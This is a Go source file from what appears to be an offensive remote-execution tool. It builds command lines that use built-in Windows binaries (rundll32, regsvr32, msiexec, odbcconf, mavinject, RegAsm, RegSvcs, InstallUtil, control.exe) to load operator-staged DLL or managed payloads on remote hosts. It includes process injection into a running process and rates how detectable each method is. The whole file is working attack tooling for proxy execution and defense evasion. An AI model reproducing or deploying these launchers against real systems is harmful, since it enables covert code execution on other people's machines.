package delivery

import (
	"errors"
	"fmt"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/rubyattack3r/remoteexec/internal/exec/payload"
)

var (
	drivePathPattern   = regexp.MustCompile(`^[A-Za-z]:\\`)
	exportNamePattern  = regexp.MustCompile(`^(?:[A-Za-z_][A-Za-z0-9_@?]*|#[0-9]+)$`)
	placeholderPattern = regexp.MustCompile(`\{[a-z_]+\}`)
)

// Binary is the public inventory contract for one built-in DLL launcher.
// argumentsTemplate is kept private so only the validated planner renders it.
type Binary struct {
	Selector           string       `json:"selector" yaml:"selector"`
	Program            string       `json:"program" yaml:"program"`
	PayloadType        payload.Kind `json:"payload_type" yaml:"payload_type"`
	RequiredExport     string       `json:"required_export" yaml:"required_export"`
	RequiredOptions    []string     `json:"required_options,omitempty" yaml:"required_options,omitempty"`
	InvocationTemplate string       `json:"invocation_template" yaml:"invocation_template"`
	Detectability      string       `json:"detectability" yaml:"detectability"`
	Notes              string       `json:"notes" yaml:"notes"`
	argumentsTemplate  string
}

var binaries = []Binary{
	{Selector: "rundll32.exe", Program: "rundll32.exe", PayloadType: "dll", RequiredExport: "value of --entry-point", InvocationTemplate: `rundll32.exe <remote-path>,<entry-point>`, argumentsTemplate: `{remote_path},{entry_point}`, Detectability: "high", Notes: "Executes an operator-selected exported DLL entry point; commonly monitored."},
	{Selector: "rundll32.exe (advpack RegisterOCX)", Program: "rundll32.exe", PayloadType: "dll", RequiredExport: "DllRegisterServer", InvocationTemplate: `rundll32.exe advpack.dll,RegisterOCX <remote-path>`, argumentsTemplate: `advpack.dll,RegisterOCX {remote_path}`, Detectability: "high", Notes: "Uses the inbox Advpack RegisterOCX export to load the DLL and invoke DllRegisterServer."},
	{Selector: "msiexec.exe (/y)", Program: "msiexec.exe", PayloadType: "dll", RequiredExport: "DllRegisterServer", InvocationTemplate: `msiexec.exe /y <remote-path>`, argumentsTemplate: `/y {remote_path}`, Detectability: "high", Notes: "Invokes DllRegisterServer through /y; unusual msiexec DLL registration is high-signal."},
	{Selector: "msiexec.exe (/z)", Program: "msiexec.exe", PayloadType: "dll", RequiredExport: "DllUnregisterServer", InvocationTemplate: `msiexec.exe /z <remote-path>`, argumentsTemplate: `/z {remote_path}`, Detectability: "high", Notes: "Invokes DllUnregisterServer through /z; unusual msiexec DLL registration is high-signal."},
	{Selector: "odbcconf.exe", Program: "odbcconf.exe", PayloadType: "dll", RequiredExport: "DllRegisterServer", InvocationTemplate: `odbcconf.exe /a {REGSVR <remote-path>}`, argumentsTemplate: `/a {REGSVR {remote_path}}`, Detectability: "high", Notes: "Invokes DllRegisterServer through REGSVR; uncommon ODBC configuration process and DLL load is high-signal."},
	{Selector: "regsvr32.exe", Program: "regsvr32.exe", PayloadType: "dll", RequiredExport: "DllRegisterServer", InvocationTemplate: `regsvr32.exe /s <remote-path>`, argumentsTemplate: `/s {remote_path}`, Detectability: "high", Notes: "Silently invokes DllRegisterServer; registration side effects are payload-defined and must be recovered separately."},
	{Selector: "regsvr32.exe (/u)", Program: "regsvr32.exe", PayloadType: "dll", RequiredExport: "DllUnregisterServer", InvocationTemplate: `regsvr32.exe /s /u <remote-path>`, argumentsTemplate: `/s /u {remote_path}`, Detectability: "high", Notes: "Silently invokes DllUnregisterServer; side effects are payload-defined and must be reviewed separately."},
	{Selector: "regsvr32.exe (/i)", Program: "regsvr32.exe", PayloadType: "dll", RequiredExport: "DllInstall", InvocationTemplate: `regsvr32.exe /s /n /i <remote-path>`, argumentsTemplate: `/s /n /i {remote_path}`, Detectability: "high", Notes: "Invokes DllInstall with bInstall=true and a null command string."},
	{Selector: "regsvr32.exe (/u /i)", Program: "regsvr32.exe", PayloadType: "dll", RequiredExport: "DllInstall", InvocationTemplate: `regsvr32.exe /s /u /n /i <remote-path>`, argumentsTemplate: `/s /u /n /i {remote_path}`, Detectability: "high", Notes: "Invokes DllInstall with bInstall=false and a null command string."},
	{Selector: "control.exe", Program: "control.exe", PayloadType: payload.CPL, RequiredExport: "CPlApplet", InvocationTemplate: `control.exe <remote-path>`, argumentsTemplate: `{remote_path}`, Detectability: "high", Notes: "Loads a Control Panel module. The staged file must implement the CPL message contract, not merely be renamed from an arbitrary DLL."},
	{Selector: "mavinject.exe", Program: "mavinject.exe", PayloadType: payload.DLL, RequiredExport: "native DLL entry point", RequiredOptions: []string{"--process-id"}, InvocationTemplate: `mavinject.exe <process-id> /INJECTRUNNING <remote-path>`, argumentsTemplate: `{process_id} /INJECTRUNNING {remote_path}`, Detectability: "high", Notes: "Injects into an existing process. The process must exist and match the DLL architecture; injection state cannot be generically reversed."},
	{Selector: "RegAsm.exe", Program: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe`, PayloadType: payload.Managed, RequiredExport: "[ComRegisterFunction] method", InvocationTemplate: `RegAsm.exe <remote-path>`, argumentsTemplate: `{remote_path}`, Detectability: "high", Notes: "Runs COM registration callbacks in a managed assembly. Use --launcher-program for another installed framework or architecture."},
	{Selector: "RegAsm.exe (/U)", Program: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe`, PayloadType: payload.Managed, RequiredExport: "[ComUnregisterFunction] method", InvocationTemplate: `RegAsm.exe /U <remote-path>`, argumentsTemplate: `/U {remote_path}`, Detectability: "high", Notes: "Runs COM unregistration callbacks in a managed assembly."},
	{Selector: "RegSvcs.exe", Program: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe`, PayloadType: payload.Managed, RequiredExport: "managed serviced component registration contract", InvocationTemplate: `RegSvcs.exe <remote-path>`, argumentsTemplate: `{remote_path}`, Detectability: "high", Notes: "Registers a signed serviced-component assembly; framework version and architecture must match."},
	{Selector: "RegSvcs.exe (/U)", Program: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe`, PayloadType: payload.Managed, RequiredExport: "managed serviced component unregistration contract", InvocationTemplate: `RegSvcs.exe /U <remote-path>`, argumentsTemplate: `/U {remote_path}`, Detectability: "high", Notes: "Unregisters a signed serviced-component assembly."},
	{Selector: "InstallUtil.exe", Program: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`, PayloadType: payload.Managed, RequiredExport: "[RunInstaller(true)] Installer methods", InvocationTemplate: `InstallUtil.exe /LogFile= /LogToConsole=false <remote-path>`, argumentsTemplate: `/LogFile= /LogToConsole=false {remote_path}`, Detectability: "high", Notes: "Runs managed installer methods; payload-defined installation side effects require separate recovery."},
	{Selector: "InstallUtil.exe (/U)", Program: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`, PayloadType: payload.Managed, RequiredExport: "[RunInstaller(true)] Installer.Uninstall", InvocationTemplate: `InstallUtil.exe /LogFile= /LogToConsole=false /U <remote-path>`, argumentsTemplate: `/LogFile= /LogToConsole=false /U {remote_path}`, Detectability: "high", Notes: "Runs managed uninstall methods; payload-defined side effects require separate recovery."},
}

func Binaries() []Binary { return append([]Binary(nil), binaries...) }

func binaryFor(selector string) (Binary, bool) {
	for _, binary := range binaries {
		if binary.Selector == selector {
			return binary, true
		}
	}
	return Binary{}, false
}

func hasLauncherOptions(spec payload.Spec) bool {
	return spec.LOLBin != "" || spec.LauncherProgram != "" || spec.LauncherArguments != ""
}

func resolveLauncher(spec payload.Spec, remotePath string) (commandLine, launcherPath string, err error) {
	if spec.LOLBin == "custom" {
		program, err := validateCustomProgram(spec.LauncherProgram)
		if err != nil {
			return "", "", err
		}
		arguments, err := renderArguments(spec.LauncherArguments, remotePath, spec.EntryPoint, spec.ProcessID, true)
		if err != nil {
			return "", "", err
		}
		return quoteCommandPart(program) + " " + arguments, program, nil
	}
	if spec.LauncherArguments != "" {
		return "", "", errors.New("delivery validation: --launcher-arguments requires --lolbin custom")
	}
	binary, ok := binaryFor(spec.LOLBin)
	if !ok {
		return "", "", fmt.Errorf("delivery validation: unsupported --lolbin %q", spec.LOLBin)
	}
	if binary.PayloadType != spec.Kind {
		return "", "", fmt.Errorf("delivery validation: --lolbin %q requires --payload-type %s, got %s", binary.Selector, binary.PayloadType, spec.Kind)
	}
	program := binary.Program
	if spec.LauncherProgram != "" {
		program, err = validateCustomProgram(spec.LauncherProgram)
		if err != nil {
			return "", "", err
		}
	}
	arguments, err := renderArguments(binary.argumentsTemplate, remotePath, spec.EntryPoint, spec.ProcessID, false)
	if err != nil {
		return "", "", err
	}
	launcherPath = ""
	if drivePathPattern.MatchString(program) {
		launcherPath = program
	}
	return quoteCommandPart(program) + " " + arguments, launcherPath, nil
}

func validateCustomProgram(configured string) (string, error) {
	program := strings.TrimSpace(strings.ReplaceAll(configured, "/", `\`))
	if program == "" {
		return "", errors.New("delivery validation: --launcher-program is required with --lolbin custom")
	}
	if strings.ContainsAny(program, "\x00\r\n\"") || !drivePathPattern.MatchString(program) || !strings.EqualFold(filepath.Ext(program), ".exe") {
		return "", errors.New("delivery validation: --launcher-program must be an absolute drive path to an .exe")
	}
	for _, part := range strings.Split(program[3:], `\`) {
		if part == "" || part == "." || part == ".." || strings.ContainsAny(part, `:*?<>|`) {
			return "", fmt.Errorf("delivery validation: invalid --launcher-program %q", configured)
		}
	}
	return program, nil
}

func renderArguments(template, remotePath, entryPoint string, processID uint32, custom bool) (string, error) {
	if strings.ContainsAny(template, "\x00\r\n") || len(template) > 32767 {
		return "", errors.New("delivery validation: launcher arguments must be a single line of at most 32767 bytes")
	}
	if !strings.Contains(template, "{remote_path}") {
		return "", errors.New("delivery validation: launcher arguments must contain {remote_path}")
	}
	if processID != 0 && !strings.Contains(template, "{process_id}") {
		return "", errors.New("delivery validation: --process-id is only valid for a launcher template containing {process_id}")
	}
	for _, placeholder := range placeholderPattern.FindAllString(template, -1) {
		if placeholder != "{remote_path}" && placeholder != "{entry_point}" && placeholder != "{process_id}" {
			return "", fmt.Errorf("delivery validation: unsupported launcher placeholder %s", placeholder)
		}
	}
	if strings.Contains(template, "{process_id}") && processID == 0 {
		return "", errors.New("delivery validation: {process_id} requires a non-zero --process-id")
	}
	if strings.Contains(template, "{entry_point}") && !exportNamePattern.MatchString(entryPoint) {
		flag := "--entry-point"
		if custom {
			flag = "{entry_point}"
		}
		return "", fmt.Errorf("delivery validation: %s requires a valid DLL export name or ordinal", flag)
	}
	arguments := strings.ReplaceAll(template, "{remote_path}", quoteCommandPart(remotePath))
	arguments = strings.ReplaceAll(arguments, "{entry_point}", entryPoint)
	arguments = strings.ReplaceAll(arguments, "{process_id}", fmt.Sprintf("%d", processID))
	return strings.TrimSpace(arguments), nil
}

func quoteCommandPart(value string) string {
	if strings.ContainsAny(value, " \t") {
		return `"` + value + `"`
	}
	return value
}
